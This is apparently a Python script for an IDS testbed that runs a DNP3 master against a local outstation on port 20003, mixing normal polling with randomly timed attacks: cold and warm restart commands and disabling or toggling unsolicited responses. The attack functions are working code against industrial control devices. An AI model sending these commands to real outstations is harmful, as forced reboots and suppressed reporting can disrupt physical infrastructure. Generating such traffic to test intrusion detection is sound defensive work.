# dnp3_master.py — exact FreyrSCADA client, port changed to 20003
# Generates both Normal (polling) and Attack traffic for IDS testing
import ctypes
import time
import struct
import random
import threading
import keyboard
from dnp3protocol.dnp3api import *

SERVER_TCP_COMMUNICATION = 1
VIEW_TRAFFIC = 1

def errorcodestring(errorcode):
    s = sDNP3ErrorCode()
    s.iErrorCode = errorcode
    dnp3_lib.DNP3ErrorCodeString(s)
    return s.LongDes.decode("utf-8")

def errorvaluestring(errorvalue):
    s = sDNP3ErrorValue()
    s.iErrorValue = errorvalue
    dnp3_lib.DNP3ErrorValueString(s)
    return s.LongDes.decode("utf-8")

def cbDebug(u16ObjectId, ptDebugData, ptErrorValue):
    if (ptDebugData.contents.u32DebugOptions & eDebugOptionsFlag.DEBUG_OPTION_TX) == eDebugOptionsFlag.DEBUG_OPTION_TX:
        print(f"TX {ptDebugData.contents.u16TxCount} bytes -> ", end='')
        for i in range(ptDebugData.contents.u16TxCount):
            print(f" {ptDebugData.contents.au8TxData[i]:02x}", end='')
        print()
    if (ptDebugData.contents.u32DebugOptions & eDebugOptionsFlag.DEBUG_OPTION_RX) == eDebugOptionsFlag.DEBUG_OPTION_RX:
        print(f"RX {ptDebugData.contents.u16RxCount} bytes <- ", end='')
        for i in range(ptDebugData.contents.u16RxCount):
            print(f" {ptDebugData.contents.au8RxData[i]:02x}", end='')
        print()
    print("", flush=True)
    return 0

def cbUpdate(u16ObjectId, ptUpdateID, ptUpdateValue, ptUpdateParams, ptErrorValue):
    print(f"📥 UPDATE — Group:{ptUpdateID.contents.eGroupID} Index:{ptUpdateID.contents.u16IndexNumber}")
    return 0

def cbClientStatus(u16ObjectId, psDAID, peSat, ptErrorValue):
    status = "✅ CONNECTED" if peSat.contents.value == eServerConnectionStatus.SERVER_CONNECTED else "❌ DISCONNECTED"
    print(f"🔗 Server Status: {status}")
    return 0

def cbUpdateIIN(u16ObjectId, ptUpdateID, u8IIN1, u8IIN2, ptErrorValue):
    return 0

def cbPollStatus(u16ObjectId, ptUpdateID, eFunctionID, ptErrorValue):
    print("📊 Poll completed")
    return 0

def cbDeviceAtt(u16ObjectId, psDAID, psDeviceAttrValue, ptErrorValue):
    return 0


# ── Attack Functions ───────────────────────────────────────────────────────────

def send_cold_restart(myClient, tErrorValue):
    """RESTART_ATTACK — forces outstation to cold restart (full reboot)"""
    print("\033[91m🚨 [ATTACK] COLD_RESTART — forcing outstation reboot...\033[0m")
    try:
        sFunctionID = sFunctionIdentification()
        sFunctionID.eFunctionID = eFunctionCode.COLD_RESTART
        dnp3_lib.DNP3ColdRestart(myClient, ctypes.byref(sFunctionID), ctypes.byref(tErrorValue))
    except Exception as e:
        print(f"⚠️  COLD_RESTART failed: {e}")

def send_warm_restart(myClient, tErrorValue):
    """RESTART_ATTACK — forces outstation to warm restart (soft reboot)"""
    print("\033[91m🚨 [ATTACK] WARM_RESTART — forcing warm restart...\033[0m")
    try:
        sFunctionID = sFunctionIdentification()
        sFunctionID.eFunctionID = eFunctionCode.WARM_RESTART
        dnp3_lib.DNP3WarmRestart(myClient, ctypes.byref(sFunctionID), ctypes.byref(tErrorValue))
    except Exception as e:
        print(f"⚠️  WARM_RESTART failed: {e}")

def send_disable_unsolicited(myClient, tErrorValue):
    """CONTROL_ATTACK — disables outstation from sending unsolicited responses"""
    print("\033[91m🚨 [ATTACK] DISABLE_UNSOLICITED — suppressing outstation reports...\033[0m")
    try:
        sFunctionID = sFunctionIdentification()
        sFunctionID.eFunctionID = eFunctionCode.DISABLE_UNSOLICITED
        dnp3_lib.DNP3DisableUnsolicited(myClient, ctypes.byref(sFunctionID), ctypes.byref(tErrorValue))
    except Exception as e:
        print(f"⚠️  DISABLE_UNSOLICITED failed: {e}")

def send_enable_unsolicited(myClient, tErrorValue):
    """CONTROL_ATTACK — re-enables unsolicited responses (used to confuse IDS)"""
    print("\033[91m🚨 [ATTACK] ENABLE_UNSOLICITED — toggling unsolicited responses...\033[0m")
    try:
        sFunctionID = sFunctionIdentification()
        sFunctionID.eFunctionID = eFunctionCode.ENABLE_UNSOLICITED
        dnp3_lib.DNP3EnableUnsolicited(myClient, ctypes.byref(sFunctionID), ctypes.byref(tErrorValue))
    except Exception as e:
        print(f"⚠️  ENABLE_UNSOLICITED failed: {e}")


# ── Attack Scheduler (background thread) ──────────────────────────────────────

def attack_scheduler(myClient, tErrorValue, stop_event):
    """
    Background thread — injects attacks at random intervals mixed with normal traffic.
    Attack → wait → normal polling → attack cycle simulates realistic IDS scenario.
    """
    attacks = [
        (send_cold_restart,        "RESTART_ATTACK"),
        (send_warm_restart,        "RESTART_ATTACK"),
        (send_disable_unsolicited, "CONTROL_ATTACK"),
        (send_enable_unsolicited,  "CONTROL_ATTACK"),
    ]

    attack_count = 0

    while not stop_event.is_set():
        # Normal traffic period: 5-15 seconds between attacks
        wait_time = random.uniform(5, 15)
        print(f"\n⏳ Next attack in {wait_time:.1f}s...")
        stop_event.wait(timeout=wait_time)

        if stop_event.is_set():
            break

        # Pick random attack
        attack_fn, attack_type = random.choice(attacks)
        attack_count += 1
        print(f"\n{'='*50}")
        print(f"  Attack #{attack_count} | Type: {attack_type}")
        print(f"{'='*50}")
        attack_fn(myClient, tErrorValue)

    print(f"\n🛑 Attack scheduler stopped — total attacks sent: {attack_count}")


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    print("**** DNP3 Master Client — Normal + Attack Traffic ****")

    if dnp3_lib.DNP3GetLibraryVersion().decode("utf-8") != DNP3_VERSION:
        print("❌ Version Mismatch!")
        exit(0)

    print(f"Library Version : {dnp3_lib.DNP3GetLibraryVersion().decode('utf-8')}")

    i16ErrorCode = ctypes.c_short()
    tErrorValue  = ctypes.c_short()

    # ── Parameters ──
    sParameters = sDNP3Parameters()
    sParameters.eAppFlag                   = eApplicationFlag.APP_CLIENT
    sParameters.ptReadCallback             = ctypes.cast(None, DNP3ReadCallback)
    sParameters.ptWriteCallback            = ctypes.cast(None, DNP3WriteCallback)
    sParameters.ptUpdateCallback           = DNP3UpdateCallback(cbUpdate)
    sParameters.ptSelectCallback           = ctypes.cast(None, DNP3ControlSelectCallback)
    sParameters.ptOperateCallback          = ctypes.cast(None, DNP3ControlOperateCallback)
    sParameters.ptDebugCallback            = DNP3DebugMessageCallback(cbDebug)
    sParameters.ptUpdateIINCallback        = DNP3UpdateIINCallback(cbUpdateIIN)
    sParameters.ptClientPollStatusCallback = DNP3ClientPollStatusCallback(cbPollStatus)
    sParameters.ptClientStatusCallback     = DNP3ClientStatusCallback(cbClientStatus)
    sParameters.ptColdRestartCallback      = ctypes.cast(None, DNP3ColdRestartCallback)
    sParameters.ptWarmRestartCallback      = ctypes.cast(None, DNP3WarmRestartCallback)
    sParameters.ptDeviceAttrCallback       = DNP3DeviceAttributeCallback(cbDeviceAtt)
    sParameters.u32Options                 = 0
    sParameters.u16ObjectId               = 1

    myClient = dnp3_lib.DNP3Create(ctypes.byref(sParameters), ctypes.byref(i16ErrorCode), ctypes.byref(tErrorValue))
    if i16ErrorCode.value != 0:
        print(f"❌ DNP3Create() failed: {errorcodestring(i16ErrorCode)}")
        exit(0)
    print("✅ Client object created")

    while True:
        sDNP3Config = sDNP3ConfigurationParameters()

        # ── Debug ──
        sDNP3Config.sDNP3ClientSet.sDebug.u32DebugOptions = (
            eDebugOptionsFlag.DEBUG_OPTION_RX | eDebugOptionsFlag.DEBUG_OPTION_TX
        )

        # ── Timestamp ──
        now = time.time()
        t   = time.localtime(now)
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u8Day           = t.tm_mday
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u8Month         = t.tm_mon
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u16Year         = t.tm_year
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u8Hour          = t.tm_hour
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u8Minute        = t.tm_min
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u8Seconds       = t.tm_sec
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u16MilliSeconds = 0
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u16MicroSeconds = 0
        sDNP3Config.sDNP3ClientSet.sTimeStamp.i8DSTTime       = 0
        sDNP3Config.sDNP3ClientSet.sTimeStamp.u8DayoftheWeek  = 4
        sDNP3Config.sDNP3ClientSet.bTimeInvalid               = False
        sDNP3Config.sDNP3ClientSet.benabaleUTCtime            = False
        sDNP3Config.sDNP3ClientSet.bUpdateCallbackCheckTimestamp = False

        # ── 1 Client Node ──
        sDNP3Config.sDNP3ClientSet.u16NoofClient = 1
        arraypointer = (sClientObject * 1)()
        sDNP3Config.sDNP3ClientSet.psClientObjects = ctypes.cast(arraypointer, ctypes.POINTER(sClientObject))

        # ── TCP port 20003 ──
        arraypointer[0].eCommMode = eCommunicationMode.TCP_IP_MODE
        arraypointer[0].sClientCommunicationSet.sEthernetCommsSet.ai8ToIPAddress = "127.0.0.1".encode('utf-8')
        arraypointer[0].sClientCommunicationSet.sEthernetCommsSet.u16PortNumber  = 20003

        # ── Protocol Settings ──
        arraypointer[0].sClientProtSet.u16MasterAddress          = 2
        arraypointer[0].sClientProtSet.u16SlaveAddress           = 1
        arraypointer[0].sClientProtSet.u32LinkLayerTimeout       = 10000
        arraypointer[0].sClientProtSet.u32ApplicationTimeout     = 20000
        arraypointer[0].sClientProtSet.u32Class0123pollInterval  = 60000
        arraypointer[0].sClientProtSet.u32Class123pollInterval   = 1000
        arraypointer[0].sClientProtSet.u32Class0pollInterval     = 0
        arraypointer[0].sClientProtSet.u32Class1pollInterval     = 0
        arraypointer[0].sClientProtSet.u32Class2pollInterval     = 0
        arraypointer[0].sClientProtSet.u32Class3pollInterval     = 0
        arraypointer[0].sClientProtSet.bFrozenAnalogInputSupport = False
        arraypointer[0].sClientProtSet.bEnableFileTransferSupport= False
        arraypointer[0].sClientProtSet.bDisableUnsolicitedStatup = False
        arraypointer[0].u32CommandTimeout                        = 50000
        arraypointer[0].u32FileOperationTimeout                  = 200000
        arraypointer[0].sClientProtSet.bDisableResetofRemotelink = False
        arraypointer[0].sClientProtSet.eLinkConform              = eLinkLayerConform.CONFORM_NEVER

        sDNP3Config.sDNP3ClientSet.bAutoGenDNP3DataObjects = True
        arraypointer[0].u16NoofObject  = 0
        arraypointer[0].psDNP3Objects  = None

        i16ErrorCode = dnp3_lib.DNP3LoadConfiguration(myClient, ctypes.byref(sDNP3Config), ctypes.byref(tErrorValue))
        if i16ErrorCode != 0:
            print(f"❌ DNP3LoadConfiguration() failed: {errorcodestring(i16ErrorCode)}")
            break
        print("✅ Configuration loaded")

        i16ErrorCode = dnp3_lib.DNP3Start(myClient, ctypes.byref(tErrorValue))
        if i16ErrorCode != 0:
            print(f"❌ DNP3Start() failed: {errorcodestring(i16ErrorCode)}")
            break
        print("✅ DNP3 Master running — connecting to port 20003...")

        # ── Start attack scheduler in background thread ──
        stop_event    = threading.Event()
        attack_thread = threading.Thread(
            target=attack_scheduler,
            args=(myClient, tErrorValue, stop_event),
            daemon=True
        )
        attack_thread.start()

        print("\n" + "="*50)
        print("  Normal polling active  (every 1s — Class 1/2/3)")
        print("  Attack scheduler active (every 5-15s randomly)")
        print("  Press X to stop")
        print("="*50 + "\n")

        while True:
            if keyboard.is_pressed('x'):
                keyboard.release('x')
                stop_event.set()
                attack_thread.join(timeout=3)
                break
            time.sleep(0.1)
        break

    dnp3_lib.DNP3Stop(myClient, ctypes.byref(tErrorValue))
    dnp3_lib.DNP3Free(myClient, ctypes.byref(tErrorValue))
    print("🛑 Master stopped")

if __name__ == "__main__":
    main()